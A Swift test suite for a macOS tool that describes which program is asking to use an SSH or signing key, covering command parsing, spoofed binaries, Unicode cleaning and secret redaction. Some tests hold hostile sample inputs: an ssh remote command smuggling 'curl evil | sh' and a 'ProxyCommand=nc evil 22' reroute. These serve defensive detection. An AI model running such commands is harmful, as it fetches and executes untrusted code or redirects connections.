import Foundation
import Testing
@testable import Blinker

private func proc(_ exe: String, _ argv: [String], name: String? = nil, started: Date = Date()) -> Proc {
    var p = Proc(pid: 4242, ppid: 1, started: started, name: name ?? String(exe.basename.prefix(16)))
    p.argv = argv
    p.exe = exe
    return p
}

@Suite struct Describing {
    @Test func gitPushOverSSH() {
        let ssh = SSH.parse(["ssh", "-o", "SendEnv=GIT_PROTOCOL", "git@github.com", "git-receive-pack 'guneysol/blinker.git'"])
        #expect(ssh?.action == "push to guneysol/blinker on github.com")
    }

    @Test func fetchOverSSH() {
        let ssh = SSH.parse(["ssh", "-p22", "-T", "git@github.com", "git-upload-pack", "'/a/b.git'"])
        #expect(ssh?.action == "fetch from a/b on github.com")
    }

    @Test func chainedRemoteCommandIsNotAFetch() {
        let ssh = SSH.parse(["ssh", "prod", "git-upload-pack x; curl evil | sh"])
        #expect(ssh?.action == "run a command on prod")
    }

    @Test func reroutedHostIsFlagged() {
        let ssh = SSH.parse(["ssh", "-o", "ProxyCommand=nc evil 22", "github.com"])
        #expect(ssh?.action == "connect to github.com (via custom ssh options)")
        #expect(SSH.parse(["ssh", "-J", "jump", "github.com"])?.rerouted == true)
        #expect(SSH.parse(["ssh", "-A", "github.com"])?.forwardsAgent == true)
        #expect(SSH.parse(["ssh", "-TA", "github.com"])?.forwardsAgent == true)
        #expect(SSH.parse(["ssh", "-o", "ForwardAgent=yes", "github.com"])?.displayHost == "github.com (forwards your key)")
        #expect(SSH.parse(["ssh", "-p", "22", "github.com"])?.forwardsAgent == false)
    }

    @Test func nonASCIIHostIsFlagged() {
        #expect(SSH.parse(["ssh", "g\u{0456}thub.com"])?.action.contains("non-ASCII") == true)
    }

    @Test func gitSubcommandSkipsGlobalOptions() {
        #expect(Git.subcommand(["git", "-C", "/x", "-c", "a=b", "--no-pager", "push", "origin"]) == ["push", "origin"])
        #expect(Git.action(["push", "-u", "origin", "main"]) == "push to origin")
        #expect(Git.action(["commit", "-m", "x"]) == "sign a commit")
    }

    @Test func sshKeygenSigningIsNotParsedAsAHost() {
        let tool = Tool(proc("/usr/bin/ssh-keygen", ["ssh-keygen", "-Y", "sign", "-n", "git", "-f", "k"]))
        #expect(tool.action == "sign with your SSH key")
        #expect(tool.isHelper(for: "commit"))
    }

    @Test func onlyTheRealHelperBorrowsGitsLabel() {
        // A hook script under `git commit` that talks to the agent is not "signing a commit".
        #expect(!Tool(proc("/usr/bin/python3", ["python3", "hook.py"])).isHelper(for: "commit"))
        #expect(!Tool(proc("/usr/bin/ssh", ["ssh", "x"])).isHelper(for: "commit"))
        // Only the exact invocation git makes counts as signing.
        #expect(Tool(proc("/opt/homebrew/Cellar/gnupg/2.4/bin/gpg", ["gpg", "--status-fd=2", "-bsau", "K"])).isHelper(for: "commit"))
        #expect(!Tool(proc("/opt/homebrew/Cellar/gnupg/2.4/bin/gpg", ["gpg", "-d", "secrets.gpg"])).isHelper(for: "commit"))
        #expect(!Tool(proc("/opt/homebrew/Cellar/gnupg/2.4/bin/gpg", ["gpg", "-bsau", "K"])).isHelper(for: "commit"))
        #expect(Tool(proc("/usr/bin/ssh-keygen", ["ssh-keygen", "-Y", "sign", "-n", "git", "-f", "k"])).isHelper(for: "commit"))
        #expect(!Tool(proc("/usr/bin/ssh-keygen", ["ssh-keygen", "-Y", "sign", "-n", "file", "-f", "k"])).isHelper(for: "commit"))
    }
}

@Suite struct Spoofing {
    @Test func renamedBinaryIsNotKnown() {
        let fake = proc("/tmp/x/git", ["git", "push"])
        #expect(!Tool.isKnownLocation(fake.exe))
        #expect(Tool.isKnownLocation("/usr/bin/ssh"))
    }

    @Test func nameMismatchIsCaught() {
        #expect(!Tool(proc("/usr/bin/ssh", ["git", "push"])).nameMatchesExecutable) // argv[0] lies
        #expect(!Tool(proc("/usr/bin/ssh", ["ssh"], name: "git")).nameMatchesExecutable)
        #expect(Tool(proc("/usr/bin/ssh", ["ssh", "host"])).nameMatchesExecutable)
    }

    @Test func toolKindComesFromThePathNotTheName() {
        #expect(Tool(proc("/tmp/evil", ["ssh", "github.com"], name: "ssh")).kind == .other)
    }

    @Test func appNameNeedsAnApplicationsFolder() {
        #expect(Requests.appName("/Applications/Ghostty.app/Contents/MacOS/ghostty") == "Ghostty")
        #expect(Requests.appName("/tmp/Ghostty.app/Contents/MacOS/ghostty") == nil)
        #expect(Requests.appName(NSHomeDirectory() + "/Applications/Ghostty.app/Contents/MacOS/ghostty") == nil)
    }

    @Test func agentNameFromArgvOnlyForRuntimes() {
        var ssh = proc("/usr/bin/ssh", ["ssh", "claude"])
        ssh.cwd = ""
        #expect(Requests.origin([ssh]) == nil)
        #expect(Requests.origin([proc("/opt/homebrew/bin/node", ["node", "/x/claude"])]) == "Claude Code")
    }

    @Test func invisibleAndBidiCharactersAreRemoved() {
        #expect(Sanitize.clean("ma\u{202E}in\u{200B}", limit: 50) == "main")
        #expect(Sanitize.clean("a\nb\tc", limit: 50) == "a b c")
        #expect(Sanitize.clean("ma\u{3164}in\u{2800}", limit: 50) == "main") // blank look-alikes
    }

    @Test func combiningMarksCannotStackOrDodgeTheLimit() {
        let zalgo = "a" + String(repeating: "\u{0301}", count: 500)
        #expect(Sanitize.clean(zalgo, limit: 10).unicodeScalars.count <= 10)
        #expect(Sanitize.clean(String(repeating: "x", count: 100), limit: 10).unicodeScalars.count == 10)
    }

    @Test func keepEndTruncatesFromTheFront() {
        #expect(Sanitize.clean("/very/long/path/to/repo", limit: 6, keepEnd: true) == "…/repo")
    }
}

@Suite struct Redaction {
    @Test func urlCredentialsAndQueries() {
        #expect(Sanitize.redactURL("https://me:ghp_x@github.com/a/b?token=1") == "https://github.com/a/b?•••")
    }

    @Test func secretFlagsAndPairs() {
        #expect(Sanitize.redact(["curl", "-H", "Authorization: Bearer abc"]) == ["curl", "-H", "•••"])
        #expect(Sanitize.redact(["x", "--api-key", "v"]) == ["x", "--api-key", "•••"])
        #expect(Sanitize.redact(["x", "--token=v"]) == ["x", "--token=•••"])
        #expect(Sanitize.redact(["mysql", "-pS3cret"]) == ["mysql", "-p•••"])
        #expect(Sanitize.redact(["env", "API_KEY=v"]) == ["env", "API_KEY=•••"])
    }

    @Test func tokenShapedWords() {
        #expect(Sanitize.redact(["deploy --flag ghp_abcdefghijklmnop"]) == ["deploy --flag •••"])
        #expect(Sanitize.redactTokens("a8f5f167f44f4964e6c998dee827110c") == "•••")
        #expect(Sanitize.redactTokens("git-receive-pack") == "git-receive-pack")
    }

    @Test func pushRemoteIsRedacted() {
        #expect(Git.action(["push", "https://u:p@h/x?sig=1"]) == "push to https://h/x?•••")
    }
}

@Suite struct Titles {
    @Test func titleDropsTheHost() {
        #expect(Request.demo.title == "Push to guneysol/blinker")
        #expect(Request.demo.headline == "Claude Code wants to push to guneysol/blinker on github.com")
    }
}

@Suite struct Waits {
    @Test func oneFreshClientIsTheLikelyAsker() {
        let now = Date()
        let old = Request.demo.with(started: now.addingTimeInterval(-600))
        let new = Request.demo.with(started: now.addingTimeInterval(-1))
        let wait = Wait(began: now, requests: [new, old], looked: true)
        #expect(wait.likely == new)
        #expect(wait.idle == [old])
    }

    @Test func twoFreshClientsAreAmbiguous() {
        let now = Date()
        let wait = Wait(began: now, requests: [Request.demo.with(started: now), Request.demo.with(started: now)], looked: true)
        #expect(wait.likely == nil)
        #expect(wait.headline == "2 programs asked at once")
    }

    @Test func noClientIsUnknown() {
        #expect(Wait(began: Date(), requests: [], looked: true).headline == "An unknown program is asking")
    }

    @Test func anIdleConnectionIsNeverTheAnswer() {
        let now = Date()
        let wait = Wait(began: now, requests: [Request.demo.with(started: now.addingTimeInterval(-600))], looked: true)
        #expect(wait.likely == nil)
        #expect(wait.headline == "An unknown program is asking")
    }

    @Test func warningsLeadTheNotification() {
        let now = Date()
        let odd = Request(pid: 1, started: now, exe: "/tmp/ssh", knownLocation: false, who: "Ghostty",
                          action: "push to a/b on github.com", command: "ssh", place: nil, host: "github.com")
        let text = Store.notificationText(Wait(began: now, requests: [odd], looked: true))
        #expect(text.body.hasPrefix("Unusual program: /tmp/ssh"))
        #expect(Store.notificationText(Wait(began: now, requests: [Request.demo.with(started: now)], looked: true)).body
                == "Claude Code: Push to guneysol/blinker")
    }

    @Test func timeExtensionLinesAreRevalidated() {
        let good = #"{"eventMessage":"Time extension received","processImagePath":"\#(TouchWatcher.driver)"}"#
        let forged = #"{"eventMessage":"Time extension received","processImagePath":"/tmp/fake"}"#
        #expect(TouchWatcher.isTimeExtension(Data(good.utf8)))
        #expect(!TouchWatcher.isTimeExtension(Data(forged.utf8)))
        #expect(!TouchWatcher.isTimeExtension(Data("Filtering the log data".utf8)))
    }
}

extension Request {
    func with(started: Date) -> Request {
        Request(pid: pid, started: started, exe: exe, knownLocation: knownLocation, who: who,
                action: action, command: command, place: place, host: host)
    }
}

extension Request {
    static let demo = Request(
        pid: 0, started: Date(), exe: "/usr/bin/ssh", knownLocation: true, who: "Claude Code",
        action: "push to guneysol/blinker on github.com", command: "git push origin feat/notify",
        place: "~/code/blinker (feat/notify)", host: "github.com"
    )
}
